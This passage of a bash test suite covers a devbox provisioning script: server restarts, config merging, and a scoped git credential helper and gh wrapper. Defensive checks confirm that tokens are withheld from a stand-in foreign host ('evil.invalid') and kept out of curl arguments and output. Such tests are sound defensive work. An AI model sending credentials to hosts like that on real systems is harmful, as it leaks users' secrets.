check "status never takes the provision lock" logLacks 'flock'
rm -f "$stubState/provision-lock-held"
printf '0.29.1\n' > "$stubState/glimmervoid-version"

floxBinDirectory="$sandbox/posthog/.flox/run/x86_64-linux.posthog-dev/bin"
mkdir -p "$floxBinDirectory" "$sandbox/posthog/.flox/run/x86_64-linux.posthog-run/bin"
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
: > "$commandLog"
floxRemoteOutput="$(runRemoteProvision)"
check "remote provision launches the captured node and resolved script directly with the flox env present" \
  logHas "setsid nohup $stubBin/node $glimmervoidScriptPath --config $sandbox/.glimmervoid/config.json"
check "remote provision appends the flox bin directory to the server PATH" \
  bash -c 'grep -E "^glimmervoid-path .*:$1\$" "$2" >/dev/null' _ "$floxBinDirectory" "$commandLog"
check "remote provision never appends the run link bin directory" \
  bash -c '! grep -E "^glimmervoid-path .*posthog-run" "$1" >/dev/null' _ "$commandLog"
check "remote provision never activates flox" logLacks 'flox activate'
check "remote provision reports both listeners and the flox environment" \
  outputHas "$floxRemoteOutput" 'both listeners ready; flox env posthog'
rm -rf "$sandbox/posthog/.flox/run"

mkdir -p "$sandbox/posthog/.flox/run/x86_64-linux.first-dev/bin" "$sandbox/posthog/.flox/run/x86_64-linux.second-dev/bin"
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
: > "$commandLog"
ambiguousFloxOutput="$(runRemoteProvision)"
check "ambiguous flox env leaves the server PATH unchanged" \
  bash -c '! grep -E "^glimmervoid-path .*\.flox" "$1" >/dev/null' _ "$commandLog"
check "ambiguous flox env is noted in the status line" outputHas "$ambiguousFloxOutput" 'flox env posthog not on PATH'
rm -rf "$sandbox/posthog/.flox/run"

mkdir -p "$sandbox/posthog/.flox/run/aarch64-linux.posthog-dev/bin" "$sandbox/posthog/.flox/run/aarch64-linux.posthog-run/bin"
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
: > "$commandLog"
otherSystemFloxOutput="$(runRemoteProvision)"
check "flox links for another system leave the server PATH unchanged" \
  bash -c '! grep -E "^glimmervoid-path .*\.flox" "$1" >/dev/null' _ "$commandLog"
check "flox links for another system are noted in the status line" \
  outputHas "$otherSystemFloxOutput" 'flox env posthog not on PATH'
rm -rf "$sandbox/posthog/.flox"

cp "$sandbox/.local/bin/gh" "$stubState/original-wrapper"
: > "$commandLog"
rerunRemoteOutput="$(runRemoteProvision)"
check "remote rerun installs no npm package" logLacks 'npm install'
check "remote rerun installs no sandbox package" logLacks 'bubblewrap'
check "remote rerun preserves the gh wrapper" cmp -s "$sandbox/.local/bin/gh" "$stubState/original-wrapper"
check "remote rerun leaves the running server untouched" logLacks 'setsid'
check "remote rerun reports the running version rather than the upgraded CLI" outputHas "$rerunRemoteOutput" 'already running; 0.28.0; left running'
check "remote rerun reports no changes" outputLacks "$rerunRemoteOutput" '[installed]'

"$testNodePath" - "$sandbox/.glimmervoid/config.json" <<'JS'
const fs = require("node:fs");
const config = JSON.parse(fs.readFileSync(process.argv[2], "utf8"));
delete config.postTurnChecks;
config.hooks = [];
fs.writeFileSync(process.argv[2], JSON.stringify(config));
JS
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-after-removal-while-running"
: > "$commandLog"
removedWhileRunningOutput="$(runRemoteProvision)"
check "operator-removed defaults raise no pending warning while the server runs" \
  outputLacks "$removedWhileRunningOutput" '[warned] config'
check "operator-removed defaults stay removed while the server runs" \
  cmp -s "$stubState/config-after-removal-while-running" "$sandbox/.glimmervoid/config.json"
rm -f "$stubState/listening-3457"
: > "$commandLog"
missingRemoteOutput="$(runRemoteProvision)"
check "a running server without its remote listener warns without restarting" outputHas "$missingRemoteOutput" 'run devbox restart-glimmervoid'
check "a running server without its remote listener stays running" logLacks 'setsid'

withdrawCommand bwrap
touch "$stubState/sandbox-install-failed"
optionalFailureOutput="$(runRemoteProvision)"
check "optional sandbox failure does not fail provision" outputHas "$optionalFailureOutput" '[warned] bwrap'
rm -f "$stubState/sandbox-install-failed"

printf '2.43.0\n' > "$stubState/git-version"
: > "$commandLog"
oldGitOutput="$(runRemoteProvision)"
check "git without GIT_NO_LAZY_FETCH is upgraded from the git-core PPA" \
  bash -c 'grep -q "add-apt-repository -y ppa:git-core/ppa" "$1" && grep -q "apt-get install -y git$" "$1"' _ "$commandLog"
check "the upgraded git is reported" outputHas "$oldGitOutput" '[installed] git: git version 2.55.0'

touch "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
printf '{"port":3000,"sessions":["live"]}' > "$sandbox/.glimmervoid/config.json"
cp "$sandbox/.glimmervoid/config.json" "$stubState/live-config"
backupsBeforePending=("$sandbox/.glimmervoid"/config.json.*.bak)
: > "$commandLog"
pendingOutput="$(runRemoteProvision)"
check "a running server is never reinstalled under itself" logLacks 'npm install -g --prefix'
check "a running server names the pending release" \
  outputHas "$pendingOutput" '[warned] glimmervoid: 0.28.0 running, 0.29.1 pending; run devbox restart-glimmervoid'
check "a running server keeps its config bytes" cmp -s "$stubState/live-config" "$sandbox/.glimmervoid/config.json"
backupsAfterPending=("$sandbox/.glimmervoid"/config.json.*.bak)
check "a pending config writes no backup" test "${#backupsAfterPending[@]}" -eq "${#backupsBeforePending[@]}"
check "a running server names the pending config" outputHas "$pendingOutput" '[warned] config: changes pending; run devbox restart-glimmervoid'
check "a running server with pending changes is left running" logLacks 'setsid'

writeStub ss <<'STUB'
#!/usr/bin/env bash
printf 'ss %s\n' "$*" >> "$DOTFILES_TEST_LOG"
printf 'State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
[[ -f "$DOTFILES_TEST_STATE/listener-pid" ]] || exit 0
printf 'LISTEN 0      511        127.0.0.1:3456      0.0.0.0:*    users:(("node",pid=%s,fd=21))\n' "$(cat "$DOTFILES_TEST_STATE/listener-pid")"
STUB
provideCommand ss
: > "$commandLog"
unknownListenerStatus=0
unknownListenerOutput="$(runRemoteProvision restart)" || unknownListenerStatus=$?
check "restart refuses to stop an unidentified listener" test "$unknownListenerStatus" -ne 0
check "restart explains why an unidentified listener stays running" outputHas "$unknownListenerOutput" 'cannot identify listener PID; left running'
check "restart does not start a second server over an unidentified listener" logLacks 'setsid'

fixtureListenerPids=()
stopFixtureListeners() {
  local fixturePid
  for fixturePid in ${fixtureListenerPids[@]+"${fixtureListenerPids[@]}"}; do
    kill -TERM "$fixturePid" 2>/dev/null || true
  done
}
registerCleanup stopFixtureListeners

waitForListenerPid() {
  local attempt
  for attempt in {1..50}; do
    if [[ -s "$stubState/listener-pid" ]]; then
      cat "$stubState/listener-pid"
      return 0
    fi
    sleep 0.1
  done
  return 1
}

firstLogLineOf() {
  grep -nF -- "$1" "$commandLog" | head -1 | cut -d: -f1
}

fixtureGlimmervoidScript="$sandbox/.local/lib/node_modules/glimmervoid/dist/fixture-server.js"
cat > "$fixtureGlimmervoidScript" <<'JS'
const fs = require("node:fs");
const path = require("node:path");
const stateDirectory = process.argv[2];
const sandboxHome = process.argv[3];
process.on("SIGTERM", () => {
  fs.copyFileSync(path.join(sandboxHome, ".glimmervoid/config.json"), path.join(stateDirectory, "config-at-stop"));
  fs.appendFileSync(path.join(stateDirectory, "commands.log"), "fixture server stopped\n");
  fs.unlinkSync(path.join(stateDirectory, "listening-3456"));
  fs.unlinkSync(path.join(stateDirectory, "listening-3457"));
  process.exit(0);
});
fs.writeFileSync(path.join(stateDirectory, "listener-pid"), String(process.pid));
setInterval(() => {}, 100);
JS

startFixtureGlimmervoidServer() {
  touch "$stubState/listening-3456" "$stubState/listening-3457"
  printf '0.28.0\n' > "$stubState/glimmervoid-version"
  rm -f "$stubState/listener-pid" "$stubState/config-at-stop" "$stubState/config-at-start"
  ("$testNodePath" "$fixtureGlimmervoidScript" "$stubState" "$sandbox" --config "$sandbox/.glimmervoid/config.json" &)
  glimmervoidListenerPid="$(waitForListenerPid)"
  fixtureListenerPids+=("$glimmervoidListenerPid")
}

startFixtureGlimmervoidServer
: > "$commandLog"
glimmervoidRestartStatus=0
glimmervoidRestartOutput="$(runRemoteProvision restart)" || glimmervoidRestartStatus=$?
check "restart of an identified glimmervoid listener succeeds" test "$glimmervoidRestartStatus" -eq 0
check "restart reads the listener PID from ss" logHas "ss -ltnp sport = :3456"
check "restart terminates the identified glimmervoid listener" bash -c '! kill -0 "$1" 2>/dev/null' _ "$glimmervoidListenerPid"
check "restart reports the old server stopped" outputHas "$glimmervoidRestartOutput" '[installed] glimmervoid server: stopped'
check "restart starts a fresh detached server" logHas "setsid nohup $stubBin/node $glimmervoidScriptPath --config $sandbox/.glimmervoid/config.json"
check "restart installs the latest release after the server stops" \
  test "$(firstLogLineOf 'fixture server stopped')" -lt "$(firstLogLineOf "npm install -g --prefix $sandbox/.local glimmervoid@0.29.1")"
check "restart installs the latest release before the server starts" \
  test "$(firstLogLineOf "npm install -g --prefix $sandbox/.local glimmervoid@0.29.1")" -lt "$(firstLogLineOf 'setsid nohup')"
check "restart leaves the config unmerged while the server runs" grep -q '"port":3000' "$stubState/config-at-stop"
check "restart merges the config before the server starts" \
  "$testNodePath" -e 'process.exit(JSON.parse(require("node:fs").readFileSync(process.argv[1], "utf8")).port === 3456 ? 0 : 1)' "$stubState/config-at-start"

startFixtureGlimmervoidServer
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-missing-host-restart"
backupsBeforeMissingHostRestart=("$sandbox/.glimmervoid"/config.json.*.bak)
: > "$commandLog"
missingHostRestartStatus=0
missingHostRestartOutput="$(runRemoteProvisionWithoutWorkspaceName restart 2>&1)" || missingHostRestartStatus=$?
check "restart without a Coder workspace variable fails" test "$missingHostRestartStatus" -ne 0
check "restart without a Coder workspace variable explains the refusal" outputHas "$missingHostRestartOutput" '[warned] devbox host'
check "restart without a Coder workspace variable kills nothing" kill -0 "$glimmervoidListenerPid"
check "restart without a Coder workspace variable installs nothing" logLacks 'npm'
check "restart without a Coder workspace variable starts nothing" logLacks 'setsid'
check "restart without a Coder workspace variable keeps the config bytes" \
  cmp -s "$stubState/config-before-missing-host-restart" "$sandbox/.glimmervoid/config.json"
backupsAfterMissingHostRestart=("$sandbox/.glimmervoid"/config.json.*.bak)
check "restart without a Coder workspace variable writes no backup" \
  test "${#backupsAfterMissingHostRestart[@]}" -eq "${#backupsBeforeMissingHostRestart[@]}"

touch "$stubState/provision-lock-held"
: > "$commandLog"
heldLockRestartStatus=0
heldLockRestartOutput="$(runRemoteProvision restart)" || heldLockRestartStatus=$?
check "restart waits behind a running ensure or provision" test "$heldLockRestartStatus" -ne 0
check "restart names the run holding the provision lock" \
  outputHas "$heldLockRestartOutput" '[warned] provision: another run is in progress'
check "restart behind a held lock kills nothing" kill -0 "$glimmervoidListenerPid"
check "restart behind a held lock installs nothing" logLacks 'npm'
check "restart behind a held lock starts nothing" logLacks 'setsid'
rm -f "$stubState/provision-lock-held"

printf '{"port":3000,}\n' > "$sandbox/.glimmervoid/config.json"
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-invalid-restart"
: > "$commandLog"
invalidConfigRestartStatus=0
invalidConfigRestartOutput="$(runRemoteProvision restart 2>&1)" || invalidConfigRestartStatus=$?
check "restart with invalid config JSON fails" test "$invalidConfigRestartStatus" -ne 0
check "restart with invalid config JSON explains the refusal" \
  outputHas "$invalidConfigRestartOutput" '[warned] config: config.json is invalid JSON; left unchanged; left running'
check "restart with invalid config JSON leaves the server running" kill -0 "$glimmervoidListenerPid"
check "restart with invalid config JSON installs nothing" logLacks 'npm install'
check "restart with invalid config JSON starts nothing" logLacks 'setsid'
check "restart with invalid config JSON keeps the config bytes" \
  cmp -s "$stubState/config-before-invalid-restart" "$sandbox/.glimmervoid/config.json"
cp "$stubState/config-before-missing-host-restart" "$sandbox/.glimmervoid/config.json"

touch "$stubState/npm-install-failed"
: > "$commandLog"
failedInstallRestartStatus=0
failedInstallRestartOutput="$(runRemoteProvision restart)" || failedInstallRestartStatus=$?
check "restart with a failed install fails" test "$failedInstallRestartStatus" -ne 0
check "restart with a failed install names the fallback release" \
  outputHas "$failedInstallRestartOutput" '[warned] glimmervoid: install of 0.29.1 failed; keeping installed 0.28.0 instead'
check "restart with a failed install still stops the old server first" bash -c '! kill -0 "$1" 2>/dev/null' _ "$glimmervoidListenerPid"
check "restart with a failed install starts the previous release" logHas "setsid nohup $stubBin/node $glimmervoidScriptPath --config $sandbox/.glimmervoid/config.json"
check "restart with a failed install brings both listeners up" outputHas "$failedInstallRestartOutput" 'both listeners ready'
rm -f "$stubState/npm-install-failed"

touch "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-foreign-restart"
rm -f "$stubState/listener-pid"
(sleep 300 & printf '%s\n' "$!" > "$stubState/listener-pid")
foreignListenerPid="$(waitForListenerPid)"
fixtureListenerPids+=("$foreignListenerPid")
: > "$commandLog"
foreignRestartStatus=0
foreignRestartOutput="$(runRemoteProvision restart)" || foreignRestartStatus=$?
check "restart refuses a listener that is not glimmervoid" test "$foreignRestartStatus" -ne 0
check "restart explains why a foreign listener stays running" outputHas "$foreignRestartOutput" 'listener is not glimmervoid; left running'
check "restart never signals a foreign listener" kill -0 "$foreignListenerPid"
check "restart does not start a server over a foreign listener" logLacks 'setsid'
check "restart installs nothing while a foreign listener holds the port" logLacks 'npm install'
check "restart leaves the config alone while a foreign listener holds the port" \
  cmp -s "$stubState/config-before-foreign-restart" "$sandbox/.glimmervoid/config.json"
kill -TERM "$foreignListenerPid" 2>/dev/null || true
rm -f "$stubState/listener-pid"

rm -f "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
touch "$stubState/npm-install-failed"
: > "$commandLog"
failedInstallProvisionStatus=0
failedInstallProvisionOutput="$(runRemoteProvision)" || failedInstallProvisionStatus=$?
check "provision with a failed install fails" test "$failedInstallProvisionStatus" -ne 0
check "provision with a failed install names the fallback release" \
  outputHas "$failedInstallProvisionOutput" '[warned] glimmervoid: install of 0.29.1 failed; keeping installed 0.28.0 instead'
rm -f "$stubState/npm-install-failed"

rm -rf "$dotfilesOriginRepo"
mkdir -p "$dotfilesOriginRepo/profiles/work-server" "$dotfilesOriginRepo/fresh-box-probe" "$dotfilesOriginRepo/glimmervoid" "$dotfilesOriginRepo/profiles/work"
cp -R "$repoRoot/script" "$repoRoot/bin" "$dotfilesOriginRepo/"
printf '{"platform":"linux","topics":["fresh-box-probe"]}\n' > "$dotfilesOriginRepo/profiles/work-server/profile.json"
printf '#!/usr/bin/env bash\nexit 0\n' > "$dotfilesOriginRepo/fresh-box-probe/install.sh"
cp "$repoRoot/glimmervoid/sync-settings.mjs" "$dotfilesOriginRepo/glimmervoid/"
cp "$repoRoot/glimmervoid/settings.json" "$dotfilesOriginRepo/glimmervoid/"
"$testGitPath" -C "$dotfilesOriginRepo" init -q -b main
commitDotfilesOrigin fresh-box
startEmptyRemoteHome
rm -f "$stubState/listening-3456" "$stubState/listening-3457" "$stubState/config-at-start"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
touch "$stubState/execute-dotfiles" "$stubState/execute-provision"
: > "$commandLog"
freshBoxStatus=0
freshBoxOutput="$(runDevbox ensure 2>&1)" || freshBoxStatus=$?
check "a fresh box ensure through the real provision phases succeeds" test "$freshBoxStatus" -eq 0
check "a fresh box converges its dotfiles between prepare and provision" remoteConvergeSitsBetweenPrepareAndProvision
check "a fresh box prepares prerequisites once and starts its server once" \
  bash -c '[[ "$(grep -c "^setsid nohup " "$1")" -eq 1 && "$(grep -c "^npm view glimmervoid@latest version$" "$1")" -eq 1 ]]' _ "$commandLog"
check "a fresh box reports no pending config" outputLacks "$freshBoxOutput" 'changes pending'
check "a fresh box starts its server with the imported operator defaults" \
  "$testNodePath" - "$stubState/config-at-start" "$repoRoot/glimmervoid/settings.json" "$remoteHome" <<'JS'
const assert = require("node:assert/strict");
const fs = require("node:fs");
const config = JSON.parse(fs.readFileSync(process.argv[2], "utf8"));
const defaults = JSON.parse(fs.readFileSync(process.argv[3], "utf8"), (_key, value) =>
  typeof value === "string" ? value.replaceAll("{{HOME}}", process.argv[4]) : value);
for (const settingName of ["skipPermissionsByDefault", "postTurnChecks", "branchGc"]) {
  assert.deepEqual(config[settingName], defaults[settingName]);
}
assert.deepEqual(config.hooks, defaults.hooks);
JS
: > "$commandLog"
freshBoxSecondEnsureOutput="$(runDevbox ensure 2>&1)"
check "the ensure after a fresh box prints no pending config warning" outputLacks "$freshBoxSecondEnsureOutput" 'changes pending'
check "the ensure after a fresh box finds the config current" outputHas "$freshBoxSecondEnsureOutput" '[present] config: current'
check "the ensure after a fresh box leaves its server running" logLacks 'setsid'
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
touch "$stubState/npm-install-failed"
: > "$commandLog"
failedInstallEnsureStatus=0
failedInstallEnsureOutput="$(runDevbox ensure 2>&1)" || failedInstallEnsureStatus=$?
check "ensure with a failed install fails" test "$failedInstallEnsureStatus" -ne 0
check "ensure with a failed install still converges and provisions" remoteConvergeSitsBetweenPrepareAndProvision
check "ensure with a failed install starts the previous release" logHas "setsid nohup $stubBin/node $glimmervoidScriptPath --config"
check "ensure with a failed install still prints the forwarding URL" \
  outputHas "$failedInstallEnsureOutput" 'https://3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev/'
rm -f "$stubState/npm-install-failed"
rm -f "$stubState/execute-dotfiles" "$stubState/execute-provision"
printf '0.28.0\n' > "$stubState/glimmervoid-version"

writeStub sleep <<'STUB'
#!/usr/bin/env bash
printf 'sleep %s\n' "$*" >> "$DOTFILES_TEST_LOG"
STUB
provideCommand sleep
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
touch "$stubState/no-remote-listener"
: > "$commandLog"
startupFailureStatus=0
startupFailureOutput="$(runRemoteProvision restart)" || startupFailureStatus=$?
check "startup fails when both listeners do not become ready" test "$startupFailureStatus" -ne 0
check "startup failure names the server log" outputHas "$startupFailureOutput" 'listeners not ready after 15s; see ~/.glimmervoid/server.log'
check "startup readiness waits are bounded to 15 seconds" test "$(countLogLines '^sleep 0.5$')" -eq 30
withdrawCommand sleep

definitionsPath="$stubState/provision-functions.sh"
awk '$0 == "case \"$devboxAction\" in" { exit } { print }' "$repoRoot/profiles/work/devbox/provision.sh" > "$definitionsPath"

runProvisionFunction() {
  runInStubbedSandbox "$sandbox" bash -c 'source "$1" prepare coder.dev.posthog.dev; shift; "$@"' _ "$definitionsPath" "$@"
}

: > "$commandLog"
printf '0.31.0\n' > "$stubState/glimmervoid-version"
newerVersionOutput="$(runProvisionFunction installDevboxGlimmervoid)"
check "a newer in-app release satisfies the version floor" outputHas "$newerVersionOutput" '[present] glimmervoid: 0.31.0'
check "a newer in-app release is never downgraded" logLacks 'npm install'
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
olderVersionOutput="$(runProvisionFunction installDevboxGlimmervoid)"
check "an older release upgrades to the minimum" outputHas "$olderVersionOutput" '[installed] glimmervoid: 0.29.1'
workbenchEnvironmentPath="$sandbox/Projects/wizard-workbench/.env"
workbenchTokenPath="$sandbox/.config/posthog/wizard-gateway-token"
mkdir -p "$sandbox/Projects/wizard-workbench" "$sandbox/.local/state/dotfiles/devbox-workbench"
runWorkbenchSecrets() {
  runInStubbedSandbox "$sandbox" "$@" bash -c 'source "$1" prepare coder.dev.posthog.dev; writeDevboxWorkbenchSecrets' _ "$definitionsPath"
}
missingSecretOutput="$(runWorkbenchSecrets WIZARD_WORKBENCH_POSTHOG_API_KEY=phx_fixture)"
check "a missing workbench secret warns once with the fix and writes neither file" bash -c '
  test "$(grep -cF "[warned] workbench secrets: WIZARD_WORKBENCH_GATEWAY_TOKEN not set; nothing written; on the laptop run hogli devbox:secret:set" <<< "$1")" -eq 1 \
    && [[ ! -e "$2" && ! -e "$3" ]]' _ "$missingSecretOutput" "$workbenchEnvironmentPath" "$workbenchTokenPath"
printf 'operator edits\n' > "$workbenchEnvironmentPath"
runWorkbenchSecrets WIZARD_WORKBENCH_POSTHOG_API_KEY=phx_fixture WIZARD_WORKBENCH_GATEWAY_TOKEN=phs_fixture >/dev/null
check "an existing workbench .env is never overwritten" bash -c '[[ "$(cat "$1")" == "operator edits" ]]' _ "$workbenchEnvironmentPath"
rm -f "$workbenchEnvironmentPath"
runWorkbenchSecrets WIZARD_WORKBENCH_POSTHOG_API_KEY=phx_fixture WIZARD_WORKBENCH_GATEWAY_TOKEN=phs_fixture >/dev/null
workbenchRerunOutput="$(runWorkbenchSecrets WIZARD_WORKBENCH_POSTHOG_API_KEY=phx_fixture WIZARD_WORKBENCH_GATEWAY_TOKEN=phs_fixture)"
check "a workbench rerun reports both files present and writes nothing" bash -c '
  [[ "$1" == *"[present] wizard gateway token"* && "$1" == *"[present] workbench .env"* && "$1" != *"[installed]"* ]] \
    && grep -qx "WIZARD_CI_GATEWAY_TOKEN_FILE=$2" "$3"' _ "$workbenchRerunOutput" "$workbenchTokenPath" "$workbenchEnvironmentPath"

personalAuthOutput="$(runProvisionFunction installDevboxPersonalGitAuth)"
check "missing personal auth warns once without printing credentials" \
  test "$(grep -cF '[warned] personal GitHub token: GH_PERSONAL_TOKEN not set; johncwaters repos will 403' <<< "$personalAuthOutput")" -eq 1
credentialHelperPath="$sandbox/.local/bin/git-credential-personal"
check "personal auth uses a path-scoped helper and useHttpPath" \
  "$testGitPath" config --file "$sandbox/.gitconfig" --get credential.https://github.com/johncwaters/.useHttpPath
check "the scoped credential helper answers only personal repos with an environment token" \
  "$testNodePath" - "$credentialHelperPath" "$BASH" <<'JS'
const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const [helperPath, bashPath] = process.argv.slice(2);
const answer = (repoPath, token, operation = 'get', host = 'github.com', protocol = 'https') => {
  const environment = { ...process.env };
  delete environment.GH_PERSONAL_TOKEN;
  if (token) environment.GH_PERSONAL_TOKEN = token;
  const execution = spawnSync(bashPath, [helperPath, operation], { env: environment, input: `protocol=${protocol}\nhost=${host}\npath=${repoPath}\n\n`, encoding: 'utf8' });
  assert.equal(execution.status, 0, execution.stderr);
  return execution.stdout;
};
for (const repoPath of ['johncwaters/glimmervoid.git', 'johncwaters/dotfiles.git']) assert.equal(answer(repoPath, 'fixture'), 'username=x-access-token\npassword=fixture\n');
for (const repoPath of ['PostHog/posthog.git', 'other/repo']) assert.equal(answer(repoPath, 'fixture'), '');
assert.equal(answer('johncwaters/glimmervoid.git'), '');
assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'store'), '');
assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'get', 'evil.invalid'), '');
assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'get', 'github.com', 'http'), '');
JS

wrapperStubDirectory="$stubState/wrapper-bin"
mkdir -p "$wrapperStubDirectory"
wrapperTestPath="$stubState/gh-wrapper-test"
sed -e 's|exec /usr/bin/gh "\$@"|printf "%s\\n" "$GH_TOKEN"; exit 0|' -e "s|/usr/bin/gh|$wrapperStubDirectory/gh-stored-login|g" \
  "$sandbox/.local/bin/gh" > "$wrapperTestPath"
cat > "$wrapperStubDirectory/gh-stored-login" <<'STUB'
#!/usr/bin/env bash
[[ -z "${GH_TOKEN:-}" && -n "${FIXTURE_STORED_LOGIN:-}" ]] || exit 1
printf '%s\n' "$FIXTURE_STORED_LOGIN"
STUB
cat > "$wrapperStubDirectory/coder" <<'STUB'
#!/usr/bin/env bash
printf 'fixture-coder\n'
STUB
cat > "$wrapperStubDirectory/git" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$FIXTURE_ORIGIN"
STUB
chmod +x "$wrapperStubDirectory/coder" "$wrapperStubDirectory/git" "$wrapperStubDirectory/gh-stored-login"
runGhWrapper() {
  env HOME="$sandbox" PATH="$wrapperStubDirectory:$coreBin" \
    GH_PERSONAL_TOKEN="${1:-}" FIXTURE_ORIGIN="$2" FIXTURE_STORED_LOGIN= "$BASH" "$wrapperTestPath" "${@:3}"
}
check "gh selects personal auth for -R" test "$(runGhWrapper fixture-personal '' pr list -R johncwaters/glimmervoid)" = fixture-personal
check "gh selects personal auth for --repo" test "$(runGhWrapper fixture-personal '' pr list --repo=johncwaters/glimmervoid)" = fixture-personal
check "gh selects personal auth from an HTTPS origin" test "$(runGhWrapper fixture-personal https://github.com/johncwaters/glimmervoid.git pr list)" = fixture-personal
check "gh selects personal auth from an SSH origin" test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git pr list)" = fixture-personal
check "gh retains Coder auth for PostHog even with a personal token" test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git pr list)" = fixture-coder
check "gh explicit repo overrides a personal origin" test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git pr list -R PostHog/posthog)" = fixture-coder
check "gh without a personal token uses Coder auth" test "$(runGhWrapper '' git@github.com:johncwaters/glimmervoid.git pr list)" = fixture-coder
check "gh api for a PostHog path from a personal cwd uses Coder auth" \
  test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git api repos/PostHog/posthog/pulls)" = fixture-coder
check "gh api for a personal path from a PostHog cwd uses personal auth" \
  test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git api -X GET /repos/johncwaters/glimmervoid/pulls?state=open)" = fixture-personal
check "gh repo view of a PostHog repo from a personal cwd uses Coder auth" \
  test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git repo view PostHog/posthog)" = fixture-coder
check "gh repo clone of a personal repo from a PostHog cwd uses personal auth" \
  test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git repo clone johncwaters/glimmervoid -- --depth 1)" = fixture-personal

runStoredLoginGhWrapper() {
  env HOME="$sandbox" PATH="$wrapperStubDirectory:$coreBin" GH_TOKEN=fixture-inherited \
    FIXTURE_STORED_LOGIN="$1" FIXTURE_ORIGIN="$2" "$BASH" "$wrapperTestPath" "${@:3}"
}
check "gh auth token hands sessions the stored login, so git pushes keep its repo scope" \
  test "$(runStoredLoginGhWrapper fixture-stored '' auth token)" = fixture-stored
check "gh auth token without a stored login falls back to Coder auth" \
  test "$(runStoredLoginGhWrapper '' '' auth token)" = fixture-coder
check "gh pr create on a PostHog repo the Coder app does not cover uses the stored login" \
  test "$(runStoredLoginGhWrapper fixture-stored https://github.com/PostHog/posthog.com.git pr create --draft)" = fixture-stored

curlStubDirectory="$stubState/curl-bin"
mkdir -p "$curlStubDirectory"
cat > "$curlStubDirectory/curl" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$*" > "$DOTFILES_TEST_STATE/curl-arguments"
cat > "$DOTFILES_TEST_STATE/curl-headers"
fixtureAnswer="$(cat "$DOTFILES_TEST_STATE/curl-answer")"
if [[ "$fixtureAnswer" == unreachable ]]; then printf '000'; exit 6; fi
printf '%s' "$fixtureAnswer"
STUB
chmod +x "$curlStubDirectory/curl"
runPersonalTokenProbe() {
  printf '%s\n' "$1" > "$stubState/curl-answer"
  runInStubbedSandbox "$sandbox" PATH="$curlStubDirectory:$stubBin:$coreBin" GH_PERSONAL_TOKEN=fixture-personal-secret \
    bash -c 'source "$1" provision coder.dev.posthog.dev; shift; "$@"' _ "$definitionsPath" "${@:2}"
}
dotfilesReadableOutput="$(runPersonalTokenProbe 200 installDevboxPersonalGitAuth)"
check "a personal token that can read dotfiles is present" \
  outputHas "$dotfilesReadableOutput" '[present] personal GitHub token: can read johncwaters/dotfiles'
check "the dotfiles probe asks GitHub for the dotfiles repo" grep -qF 'https://api.github.com/repos/johncwaters/dotfiles' "$stubState/curl-arguments"
check "the dotfiles probe sends the token as a header on stdin" grep -qxF 'Authorization: Bearer fixture-personal-secret' "$stubState/curl-headers"
check "the dotfiles probe never puts the token in curl arguments" bash -c '! grep -qF fixture-personal-secret "$1"' _ "$stubState/curl-arguments"
check "the dotfiles probe never prints the token" outputLacks "$dotfilesReadableOutput" fixture-personal-secret
for refusedStatus in 404 403; do
  check "a personal token refused dotfiles with $refusedStatus warns with the grant to add" \
    outputHas "$(runPersonalTokenProbe "$refusedStatus" probeDevboxPersonalTokenDotfilesAccess)" \
    '[warned] personal GitHub token: cannot read johncwaters/dotfiles; grant the fine-grained token Contents read and write on that repo'
done
unreachableProbeStatus=0
unreachableProbeOutput="$(runPersonalTokenProbe unreachable probeDevboxPersonalTokenDotfilesAccess)" || unreachableProbeStatus=$?
check "an unreachable GitHub warns about the dotfiles probe" \
  outputHas "$unreachableProbeOutput" '[warned] personal GitHub token: cannot reach GitHub to check dotfiles access'
check "an unreachable GitHub does not fail provisioning" test "$unreachableProbeStatus" -eq 0

printf '{"projects":[],"checkForUpdates":false,"scrollback":100}\n' > "$sandbox/.glimmervoid/config.json"
mkdir -p "$sandbox/.dotfiles/profiles/work"
cp "$repoRoot/glimmervoid/sync-settings.mjs" "$sandbox/.dotfiles/glimmervoid/sync-settings.mjs"
printf '{"scrollback":100,"checkForUpdates":true}\n' > "$sandbox/.dotfiles/glimmervoid/settings.json"
printf '{"scrollback":100,"checkForUpdates":false}\n' > "$sandbox/.glimmervoid/dotfiles-settings-base.json"
"$testNodePath" -e 'const fs=require("fs");const config=require(process.argv[1]);config.scrollback=100;fs.writeFileSync(process.argv[1], JSON.stringify(config))' "$sandbox/.glimmervoid/config.json"
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-shared-settings"
touch "$stubState/listening-3456"
pendingSharedSettingsOutput="$(runRemoteProvision)"
check "a running box defers the shared settings merge" outputHas "$pendingSharedSettingsOutput" '[warned] config: changes pending; run devbox restart-glimmervoid'
